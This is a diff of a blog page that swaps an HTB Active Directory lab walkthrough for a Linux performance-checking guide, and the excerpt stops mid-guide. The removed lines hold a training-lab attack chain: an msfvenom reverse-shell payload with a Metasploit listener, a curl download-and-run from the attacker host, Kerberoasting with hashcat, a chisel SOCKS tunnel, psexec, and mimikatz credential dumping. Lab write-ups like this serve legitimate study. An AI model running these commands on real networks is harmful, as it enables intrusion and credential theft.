@@ -18,10 +18,10 @@
     <meta name="theme-color" media="(prefers-color-scheme: light)" content="#ffffff" />
     <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#1b1b1b" />
 
-    <meta name="description" content="AD Enumeration &amp; Attacks Skills Assessment Part I">
+    <meta name="description" content="Linux Perf Analysis - Quickly Check Your Systems Health">
 
     
-        <title>AD Enumeration &amp; Attacks Skills Assessment Part I | Vamsi200 Blog</title>
+        <title>Linux Perf Analysis - Quickly Check Your Systems Health | Vamsi200 Blog</title>
     
 
     
@@ -67,19 +67,21 @@
 
 <div id="single-header">
   <h1>
-    AD Enumeration &amp; Attacks Skills Assessment Part I
+    Linux Perf Analysis - Quickly Check Your Systems Health
   </h1>
   <div id="single-meta">
     
     
-        <span class="datesub">Feb 11, 2025</span>
+        <span class="datesub">Mar 8, 2026</span>
       
 <span id="tags">
   &nbsp;&nbsp;
    <span>
-    <a href="https://vamsi200.github.io/tags/htb/">#htb</a>
+    <a href="https://vamsi200.github.io/tags/linux/">#linux</a>
   </span>&nbsp; <span>
-    <a href="https://vamsi200.github.io/tags/cybersec/">#cybersec</a>
+    <a href="https://vamsi200.github.io/tags/guide/">#guide</a>
+  </span>&nbsp; <span>
+    <a href="https://vamsi200.github.io/tags/perfanalysis/">#perfanalysis</a>
   </span>&nbsp;</span>
 
 
@@ -91,18 +93,49 @@
 <aside class="hidden lg:block toc " id="tableOfContentContainer">
   <nav id="TableOfContents">
   <ul>
-    <li><a href="#initial-access">Initial Access</a>
+    <li><a href="#uptime">uptime</a>
       <ul>
-        <li><a href="#reconnaissance">Reconnaissance</a></li>
-        <li><a href="#question-1---submit-the-contents-of-the-flagtxt-file-on-the-administrator-desktop-of-the-web-server">Question 1 - Submit the contents of the flag.txt file on the administrator Desktop of the web server</a></li>
-        <li><a href="#reverse-shell-using-metasploit">Reverse Shell Using Metasploit</a></li>
-        <li><a href="#question-2---kerberoast-an-account-with-the-spn-mssqlsvcsql01inlanefreightlocal1433-and-submit-the-account-name-as-your-answer">Question 2 - Kerberoast an account with the SPN MSSQLSvc/SQL01.inlanefreight.local:1433 and submit the account name as your answer</a></li>
-        <li><a href="#question-3----crack-the-accounts-password-submit-the-cleartext-value">Question 3 -  Crack the account&rsquo;s password. Submit the cleartext value.</a></li>
-        <li><a href="#question-4---submit-the-contents-of-the-flagtxt-file-on-the-administrator-desktop-on-ms01">Question 4 - Submit the contents of the flag.txt file on the Administrator desktop on MS01</a></li>
-        <li><a href="#question-5----find-cleartext-credentials-for-another-domain-user-submit-the-username-as-your-answer">Question 5 -  Find cleartext credentials for another domain user. Submit the username as your answer.</a></li>
-        <li><a href="#question-6---submit-this-users-cleartext-password">Question 6 - Submit this user&rsquo;s cleartext password.</a></li>
-        <li><a href="#question-7---what-attack-can-this-user-perform">Question 7 - What attack can this user perform?</a></li>
-        <li><a href="#question-8---take-over-the-domain-and-submit-the-contents-of-the-flagtxt-file-on-the-administrator-desktop-on-dc01">Question 8 - Take over the domain and submit the contents of the flag.txt file on the Administrator Desktop on DC01</a></li>
+        <li><a href="#what-can-we-infer-from-this-and-what-to-look-at">What can we infer from this and what to look at?</a></li>
+      </ul>
+    </li>
+    <li><a href="#vmstat">vmstat</a>
+      <ul>
+        <li><a href="#proc">Proc</a></li>
+        <li><a href="#memory-and-swap">Memory And Swap</a></li>
+        <li><a href="#io">IO</a></li>
+        <li><a href="#cpu">Cpu</a></li>
+        <li><a href="#what-can-we-infer-from-this-and-what-to-look-at-1">What can we infer from this and what to look at?</a></li>
+      </ul>
+    </li>
+    <li><a href="#dmesg">dmesg</a>
+      <ul>
+        <li><a href="#what-can-we-infer-from-this-and-what-to-look-at-2">What can we infer from this and what to look at?</a></li>
+      </ul>
+    </li>
+    <li><a href="#iostat">iostat</a>
+      <ul>
+        <li><a href="#key-fields">Key Fields</a></li>
+        <li><a href="#what-can-we-infer-from-this-and-what-to-look-at-3">What can we infer from this and what to look at?</a></li>
+      </ul>
+    </li>
+    <li><a href="#free">free</a>
+      <ul>
+        <li><a href="#what-can-we-infer-from-this-and-what-to-look-at-4">What can we infer from this and what to look at?</a></li>
+      </ul>
+    </li>
+    <li><a href="#top">top</a>
+      <ul>
+        <li><a href="#what-can-we-infer-from-this-and-what-to-look-at-5">What can we infer from this and what to look at?</a></li>
+      </ul>
+    </li>
+    <li><a href="#mpstat">mpstat</a>
+      <ul>
+        <li><a href="#what-can-we-infer-from-this-and-what-to-look-at-6">What can we infer from this and what to look at?</a></li>
+      </ul>
+    </li>
+    <li><a href="#pidstat">pidstat</a>
+      <ul>
+        <li><a href="#what-can-we-infer-from-this-and-what-to-look-at-7">What can we infer from this and what to look at?</a></li>
       </ul>
     </li>
   </ul>
@@ -111,308 +144,65 @@
 
 
 
-<main><h2 id="initial-access">Initial Access</h2>
-<h3 id="reconnaissance">Reconnaissance</h3>
-<p>Given the Scenario, we get the user <code>admin</code> and the password <code>My_W3bsH3ll_*********</code>, so we login with the credentials:</p>
-
-
-
-
-
-<div style="text-align: center; margin: 20px 0;">
-  <img src="/images/AD1.png" alt="Image" 
-       style="border: 0px solid grey; border-radius: 6px; 
-              max-width: 100%; height: auto; 
-              width: 600px;">
-  
-</div>
-
-<h3 id="question-1---submit-the-contents-of-the-flagtxt-file-on-the-administrator-desktop-of-the-web-server">Question 1 - Submit the contents of the flag.txt file on the administrator Desktop of the web server</h3>
-<ul>
-<li>Well, seems that we can access the contents of the Administrator Desktop, so I just grabbed the flag
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>type C:\Users\Administrator\Desktop\flag.txt
-</span></span></code></pre></div></li>
-</ul>
-
+<main>
 
 
 
 
 <div style="text-align: center; margin: 20px 0;">
-  <img src="/images/AD2.png" alt="Image" 
+  <img src="/images/perf.png" alt="Image" 
        style="border: 0px solid grey; border-radius: 6px; 
               max-width: 100%; height: auto; 
-              width: 600px;">
+              width: 1000px;">
   
 </div>
 
-<h3 id="reverse-shell-using-metasploit">Reverse Shell Using Metasploit</h3>
-<ol>
-<li><strong>Payload Generation</strong>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msfvenom -p windows/x64/meterpreter/reverse_https lhost<span style="color:#f92672">=</span>&lt;attacker_ip&gt; -f exe -o payload.exe lport<span style="color:#f92672">=</span><span style="color:#ae81ff">4444</span>
-</span></span></code></pre></div></li>
-</ol>
-
-
-
-
-
-<div style="text-align: center; margin: 20px 0;">
-  <img src="/images/AD3.png" alt="Image" 
-       style="border: 0px solid grey; border-radius: 6px; 
-              max-width: 100%; height: auto; 
-              width: 600px;">
-  
-</div>
-
-<ol start="2">
-<li><strong>Metasploit Listener Configuration</strong>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>use exploit/multi/handler
-</span></span><span style="display:flex;"><span>set payload windows/x64/meterpreter/reverse_https
-</span></span><span style="display:flex;"><span>set LHOST 10.10.15.161
-</span></span><span style="display:flex;"><span>set LPORT <span style="color:#ae81ff">4444</span>
-</span></span></code></pre></div></li>
-</ol>
-
-
-
-
-
-<div style="text-align: center; margin: 20px 0;">
-  <img src="/images/AD4.png" alt="Image" 
-       style="border: 0px solid grey; border-radius: 6px; 
-              max-width: 100%; height: auto; 
-              width: 600px;">
-  
-</div>
-
-<ol start="3">
-<li><strong>Payload Delivery And Execution</strong>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python3 -m http.server
-</span></span></code></pre></div></li>
-</ol>
-<ul>
-<li>using curl to download and executing the payload
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl 10.10.15.161:8000/payload.exe -o payload.exe
-</span></span><span style="display:flex;"><span>./payload.exe
-</span></span></code></pre></div></li>
-</ul>
-
-
-
-
-
-<div style="text-align: center; margin: 20px 0;">
-  <img src="/images/AD5.png" alt="Image" 
-       style="border: 0px solid grey; border-radius: 6px; 
-              max-width: 100%; height: auto; 
-              width: 600px;">
-  
-</div>
-
-<ul>
-<li>Got the Shell
-
-
-
-
-
-<div style="text-align: center; margin: 20px 0;">
-  <img src="/images/AD6.png" alt="Image" 
-       style="border: 0px solid grey; border-radius: 6px; 
-              max-width: 100%; height: auto; 
-              width: 600px;">
-  
-</div>
-</li>
-</ul>
-<h3 id="question-2---kerberoast-an-account-with-the-spn-mssqlsvcsql01inlanefreightlocal1433-and-submit-the-account-name-as-your-answer">Question 2 - Kerberoast an account with the SPN MSSQLSvc/SQL01.inlanefreight.local:1433 and submit the account name as your answer</h3>
-<ul>
-<li>Enumerating SPNs with setspn.exe<sup id="fnref:1"><a href="#fn:1" class="footnote-ref" role="doc-noteref">1</a></sup>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>setspn.exe -Q */*
-</span></span></code></pre></div></li>
-</ul>
-
-
-
-
-
-<div style="text-align: center; margin: 20px 0;">
-  <img src="/images/AD8.png" alt="Image" 
-       style="border: 0px solid grey; border-radius: 6px; 
-              max-width: 100%; height: auto; 
-              width: 600px;">
-  
-</div>
-
-<ul>
-<li>We got our answer that is - <code>s*****l</code></li>
-</ul>
-<h3 id="question-3----crack-the-accounts-password-submit-the-cleartext-value">Question 3 -  Crack the account&rsquo;s password. Submit the cleartext value.</h3>
-<ul>
-<li>To get the password we can use <code>PowerView</code>, We can use same method, by running a python server and curl it :</li>
-<li>Now to import the file we run :
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>Import-Module .\PowerView.ps1
-</span></span></code></pre></div></li>
-</ul>
-
-
-
-
-
-<div style="text-align: center; margin: 20px 0;">
-  <img src="/images/AD7.png" alt="Image" 
-       style="border: 0px solid grey; border-radius: 6px; 
-              max-width: 100%; height: auto; 
-              width: 600px;">
-  
-</div>
-
-<ul>
-<li>Now that we have it imported, we run to the get the SPN Ticket <sup id="fnref:2"><a href="#fn:2" class="footnote-ref" role="doc-noteref">2</a></sup>:
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>Get-DomainUser -Identity svc_sql | Get-DomainSPNTicket -Format Hashcat
-</span></span></code></pre></div></li>
-</ul>
-
-
-
-
-
-<div style="text-align: center; margin: 20px 0;">
-  <img src="/images/AD9.png" alt="Image" 
-       style="border: 0px solid grey; border-radius: 6px; 
-              max-width: 100%; height: auto; 
-              width: 600px;">
-  
-</div>
-
-<ul>
-<li>Nice! we got the hash, lets crack it using Hashcat, which gives us the password <code>lu***7</code>:
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>hashcat -m <span style="color:#ae81ff">13100</span> svc_sql_hash /usr/share/wordlists/rockyou.txt
-</span></span></code></pre></div></li>
-</ul>
-<h3 id="question-4---submit-the-contents-of-the-flagtxt-file-on-the-administrator-desktop-on-ms01">Question 4 - Submit the contents of the flag.txt file on the Administrator desktop on MS01</h3>
-<ul>
-<li>
-<p>Before we proceed, Let&rsquo;s first get the IP of MS01 by pinging it.. which reveals - <code>172.16.6.**</code>
-
-
-
-
-
-<div style="text-align: center; margin: 20px 0;">
-  <img src="/images/AD24.png" alt="Image" 
-       style="border: 0px solid grey; border-radius: 6px; 
-              max-width: 100%; height: auto; 
-              width: 600px;">
-  
-</div>
-</p>
-</li>
-<li>
-<p>Let&rsquo;s try to login to MS01 with the credentials we found, to do that we run<sup id="fnref:3"><a href="#fn:3" class="footnote-ref" role="doc-noteref">3</a></sup>:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>$password = ConvertTo-SecureString <span style="color:#e6db74">&#34;&lt;password&gt;&#34;</span> -AsPlainText -Force
-</span></span><span style="display:flex;"><span>$cred = new-object System.Management.Automation.PSCredential (<span style="color:#e6db74">&#34;INLANEFREIGHT\svc_sql&#34;</span>, $password)
-</span></span><span style="display:flex;"><span>Enter-PSSession -ComputerName MS01-INLANEFREIGHT.LOCAL -Credential $cred
-</span></span></code></pre></div></li>
-</ul>
-
-
-
-
-
-<div style="text-align: center; margin: 20px 0;">
-  <img src="/images/AD10.png" alt="Image" 
-       style="border: 0px solid grey; border-radius: 6px; 
-              max-width: 100%; height: auto; 
-              width: 800px;">
-  
-</div>
-
-<ul>
-<li>
-<p>It worked! but when I try to get the flag it didn&rsquo;t work, now we have to find a workaround to get a proper Shell, so that we can retreive the flag, One way is that we can start a Socks Proxy using Metasploit, I tried it but was not working.. so I used <code>chisel.exe</code> to do it.</p>
-</li>
-<li>
-<p>I downloaded it using curl and ran it.</p>
+<h1 id="introduction">Introduction</h1>
+<p>I&rsquo;ve been using linux for a while(almost ten years), In the early days, I used to have this very cheap and slow puter. I always used to wonder why the hell it is so slow all of a sudden, since I was new to linux and have been a windows user previously I had no idea how to even open terminal and check what&rsquo;s wrong. Eventually I ofcourse learned through tutorials and all&hellip; Uhmm, well that&rsquo;s the intro man, I have nothing to say anymore. Let&rsquo;s just go straight into schize.</p>
 <blockquote>
-<p>change/add the proxychains config to use socks5</p>
+<p>Note: This is a multi-part series. In this part, we’ll cover some basic tools.</p>
 </blockquote>
-<p>On Attack Machine(Linux):</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>chisel server -p <span style="color:#ae81ff">9088</span> --reverse
-</span></span></code></pre></div><p>On Target Machine(Windows):</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>./chisel.exe client <span style="color:#e6db74">&#39;Attack-IP:9088&#39;</span> R:socks
-</span></span></code></pre></div></li>
-</ul>
-
-
-
-
-
-<div style="text-align: center; margin: 20px 0;">
-  <img src="/images/AD11.png" alt="Image" 
-       style="border: 0px solid grey; border-radius: 6px; 
-              max-width: 100%; height: auto; 
-              width: 900px;">
-  
-</div>
-
-<p>Now using <code>impacket-pssexec</code> we can get the flag:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>proxychains impacket-psexec INLANEFREIGHT.LOCAL/&lt;user&gt;:&lt;password&gt;@&lt;Target&gt;
-</span></span></code></pre></div>
-
-
-
-
-<div style="text-align: center; margin: 20px 0;">
-  <img src="/images/AD13.png" alt="Image" 
-       style="border: 0px solid grey; border-radius: 6px; 
-              max-width: 100%; height: auto; 
-              width: 600px;">
-  
-</div>
-
-<h3 id="question-5----find-cleartext-credentials-for-another-domain-user-submit-the-username-as-your-answer">Question 5 -  Find cleartext credentials for another domain user. Submit the username as your answer.</h3>
+<h1 id="goal">Goal</h1>
+<p>The goal is simple: <strong>quickly collect system data and form a rough diagnosis.</strong></p>
+<p>We want to identify whether the issue is:</p>
 <ul>
-<li>I ran a nmap scan to find that we have rdp open, so I logged in using <code>xfreerdp</code>, also I found out that we can connect to a FreeRDP server with a shared directory<sup id="fnref:4"><a href="#fn:4" class="footnote-ref" role="doc-noteref">4</a></sup>, so I shared it with all the tools that we may need.
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>proxychains xfreerdp  /v:<span style="color:#e6db74">&#39;172.16.6.**:3389&#39;</span> /u:<span style="color:#e6db74">&#34;inlanefreight\&lt;user&gt;&#34;</span> /p:<span style="color:#e6db74">&#39;&lt;password&gt;&#39;</span> /drive:Shared,/opt/test
-</span></span></code></pre></div></li>
+<li>CPU issue?</li>
+<li>Memory issue?</li>
+<li>Disk issue?</li>
+<li>Network issue?</li>
 </ul>
-
-
-
-
-
-<div style="text-align: center; margin: 20px 0;">
-  <img src="/images/AD14.png" alt="Image" 
-       style="border: 0px solid grey; border-radius: 6px; 
-              max-width: 100%; height: auto; 
-              width: 600px;">
-  
-</div>
-
+<h1 id="commands-we-will-be-covering">Commands we will be covering</h1>
 <ul>
+<li>uptime</li>
+<li>vmstat</li>
+<li>dmesg</li>
+<li>iostat</li>
+<li>free</li>
+<li>top</li>
+<li>mpstat</li>
+<li>pidstat</li>
+</ul>
+<h2 id="uptime">uptime</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ uptime
+</span></span><span style="display:flex;"><span>19:41:35 up 10:50,  <span style="color:#ae81ff">1</span> user,  load average: 0.87, 1.06, 1.11
+</span></span></code></pre></div><ul>
 <li>
-<p>I first ran Inveigh to find anything interesting, but nothing..
-
-
-
-
-
-<div style="text-align: center; margin: 20px 0;">
-  <img src="/images/AD15.png" alt="Image" 
-       style="border: 0px solid grey; border-radius: 6px; 
-              max-width: 100%; height: auto; 
-              width: 600px;">
-  
-</div>
-</p>
+<p>uptime is a quick way to check the load average&rsquo;s over time. As you can see(got the reference??) above there are three numbers, linux updates them continuously, using an exponential moving average.</p>
 </li>
 <li>
-<p>So, I went with <code>mimikatz</code> and ran:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>privilege::debug 
-</span></span><span style="display:flex;"><span>sekurlsa::logonpasswords
-</span></span></code></pre></div></li>
+<p>The kernel recalculates it roughly every 5 seconds, each value - 1, 5, 15 is just a different smoothing window</p>
+</li>
+<li>
+<p>So:</p>
+<ul>
+<li>1-min load →  reacts quickly</li>
+<li>5-min load →  smoother</li>
+<li>15-min load →  very slow, has a stable trend</li>
+</ul>
+</li>
+<li>
+<p>See below image, the 1-min load dramatically increased beacuse I started playing some random 4k video, whilst 5-min load increased a bit and 15-min load by just one.</p>
+</li>
 </ul>
 
 
@@ -420,118 +210,322 @@
 
 
 <div style="text-align: center; margin: 20px 0;">
-  <img src="/images/AD16.png" alt="Image" 
+  <img src="/images/up1.png" alt="Image" 
        style="border: 0px solid grey; border-radius: 6px; 
               max-width: 100%; height: auto; 
-              width: 600px;">
+              width: 1000px;">
   
 </div>
 
+<blockquote>
+<p>💡 Tip:
+Use <code>watch</code> to observe load changes live:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>watch -n <span style="color:#ae81ff">2</span> uptime
+</span></span></code></pre></div><p>This is especially useful when testing something like this. Learn more about watch using <code>man watch</code></p>
+</blockquote>
+<p>Important:</p>
+<blockquote>
+<p>Load average is <strong>NOT CPU usage</strong>. It includes:</p>
+</blockquote>
 <ul>
-<li>we get this user <code>t*****</code> on Domain <code>DC01</code> which is the answer, Moving on to next question..</li>
+<li>Running processes</li>
+<li>Runnable (waiting for CPU)</li>
+<li>Uninterruptible sleep (usually I/O wait)</li>
 </ul>
-<h3 id="question-6---submit-this-users-cleartext-password">Question 6 - Submit this user&rsquo;s cleartext password.</h3>
+<h3 id="what-can-we-infer-from-this-and-what-to-look-at">What can we infer from this and what to look at?</h3>
+<ul>
+<li>Compare load to CPU count:
+<ul>
+<li>Load ≈ CPU cores →  system is busy but fine</li>
+<li>Load &raquo; CPU cores →  contention/bottleneck</li>
+</ul>
+</li>
+<li>If load spikes suddenly:
+<ul>
+<li>Check <code>top</code> or <code>pidstat</code></li>
+</ul>
+</li>
+<li>If load is high but CPU usage is low:
+<ul>
+<li>Likely I/O bottleneck →  check <code>iostat</code></li>
+</ul>
+</li>
+<li>Trend matters:
+<ul>
+<li>1-min &raquo; 15-min →  recent spike</li>
+<li>All high →  sustained pressure</li>
+</ul>
+</li>
+</ul>
+<h2 id="vmstat">vmstat</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>&gt; $ vmstat <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>procs -----------memory---------- ---swap-- -----io---- -system-- -------cpu-------
+</span></span><span style="display:flex;"><span> r  b   swpd   free   buff  cache   si   so    bi    bo   in   cs us sy id wa st gu
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">4</span>  <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> <span style="color:#ae81ff">5521268</span> <span style="color:#ae81ff">1002176</span> <span style="color:#ae81ff">4910376</span> <span style="color:#ae81ff">0</span>    <span style="color:#ae81ff">0</span>   <span style="color:#ae81ff">355</span>   <span style="color:#ae81ff">286</span> <span style="color:#ae81ff">1793</span>    <span style="color:#ae81ff">5</span>  <span style="color:#ae81ff">8</span>  <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">91</span>  <span style="color:#ae81ff">0</span>  <span style="color:#ae81ff">0</span>  <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">1</span>  <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> <span style="color:#ae81ff">5522828</span> <span style="color:#ae81ff">1002176</span> <span style="color:#ae81ff">4910400</span> <span style="color:#ae81ff">0</span>    <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span>  <span style="color:#ae81ff">443</span> <span style="color:#ae81ff">1167</span>  <span style="color:#ae81ff">2</span>  <span style="color:#ae81ff">0</span> <span style="color:#ae81ff">97</span>  <span style="color:#ae81ff">0</span>  <span style="color:#ae81ff">0</span>  <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">0</span>  <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> <span style="color:#ae81ff">5522884</span> <span style="color:#ae81ff">1002176</span> <span style="color:#ae81ff">4910400</span> <span style="color:#ae81ff">0</span>    <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span> <span style="color:#ae81ff">1049</span> <span style="color:#ae81ff">3614</span>  <span style="color:#ae81ff">3</span>  <span style="color:#ae81ff">0</span> <span style="color:#ae81ff">96</span>  <span style="color:#ae81ff">0</span>  <span style="color:#ae81ff">0</span>  <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">0</span>  <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> <span style="color:#ae81ff">5541796</span> <span style="color:#ae81ff">1002176</span> <span style="color:#ae81ff">4894200</span> <span style="color:#ae81ff">0</span>    <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span>  <span style="color:#ae81ff">871</span> <span style="color:#ae81ff">1882</span>  <span style="color:#ae81ff">5</span>  <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">94</span>  <span style="color:#ae81ff">0</span>  <span style="color:#ae81ff">0</span>  <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">0</span>  <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> <span style="color:#ae81ff">5541816</span> <span style="color:#ae81ff">1002176</span> <span style="color:#ae81ff">4894200</span> <span style="color:#ae81ff">0</span>    <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span>  <span style="color:#ae81ff">327</span>  <span style="color:#ae81ff">844</span>  <span style="color:#ae81ff">3</span>  <span style="color:#ae81ff">0</span> <span style="color:#ae81ff">97</span>  <span style="color:#ae81ff">0</span>  <span style="color:#ae81ff">0</span>  <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">0</span>  <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> <span style="color:#ae81ff">5546768</span> <span style="color:#ae81ff">1002176</span> <span style="color:#ae81ff">4894200</span> <span style="color:#ae81ff">0</span>    <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span>  <span style="color:#ae81ff">586</span> <span style="color:#ae81ff">1292</span>  <span style="color:#ae81ff">3</span>  <span style="color:#ae81ff">0</span> <span style="color:#ae81ff">96</span>  <span style="color:#ae81ff">0</span>  <span style="color:#ae81ff">0</span>  <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">0</span>  <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> <span style="color:#ae81ff">5546064</span> <span style="color:#ae81ff">1002184</span> <span style="color:#ae81ff">4894192</span> <span style="color:#ae81ff">0</span>    <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span>    <span style="color:#ae81ff">40</span>  <span style="color:#ae81ff">414</span> <span style="color:#ae81ff">1005</span>  <span style="color:#ae81ff">2</span>  <span style="color:#ae81ff">0</span> <span style="color:#ae81ff">97</span>  <span style="color:#ae81ff">1</span>  <span style="color:#ae81ff">0</span>  <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">0</span>  <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> <span style="color:#ae81ff">5546416</span> <span style="color:#ae81ff">1002184</span> <span style="color:#ae81ff">4894200</span> <span style="color:#ae81ff">0</span>    <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span>  <span style="color:#ae81ff">523</span> <span style="color:#ae81ff">1118</span>  <span style="color:#ae81ff">2</span>  <span style="color:#ae81ff">0</span> <span style="color:#ae81ff">97</span>  <span style="color:#ae81ff">0</span>  <span style="color:#ae81ff">0</span>  <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">0</span>  <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> <span style="color:#ae81ff">5548712</span> <span style="color:#ae81ff">1002184</span> <span style="color:#ae81ff">4894200</span> <span style="color:#ae81ff">0</span>    <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span>  <span style="color:#ae81ff">401</span> <span style="color:#ae81ff">1063</span>  <span style="color:#ae81ff">2</span>  <span style="color:#ae81ff">0</span> <span style="color:#ae81ff">98</span>  <span style="color:#ae81ff">0</span>  <span style="color:#ae81ff">0</span>  <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">0</span>  <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> <span style="color:#ae81ff">5548964</span> <span style="color:#ae81ff">1002184</span> <span style="color:#ae81ff">4894200</span> <span style="color:#ae81ff">0</span>    <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span>  <span style="color:#ae81ff">506</span> <span style="color:#ae81ff">1074</span>  <span style="color:#ae81ff">2</span>  <span style="color:#ae81ff">0</span> <span style="color:#ae81ff">97</span>  <span style="color:#ae81ff">0</span>  <span style="color:#ae81ff">0</span>  <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">0</span>  <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> <span style="color:#ae81ff">5548964</span> <span style="color:#ae81ff">1002184</span> <span style="color:#ae81ff">4894200</span> <span style="color:#ae81ff">0</span>    <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span>  <span style="color:#ae81ff">354</span>  <span style="color:#ae81ff">991</span>  <span style="color:#ae81ff">2</span>  <span style="color:#ae81ff">0</span> <span style="color:#ae81ff">97</span>  <span style="color:#ae81ff">0</span>  <span style="color:#ae81ff">0</span>  <span style="color:#ae81ff">0</span>
+</span></span></code></pre></div><ul>
+<li><code>vmstat</code> = Virtual Memory Statistics (not just memmory btw).</li>
+<li>It gives a compact, real-time view of the entire system like:
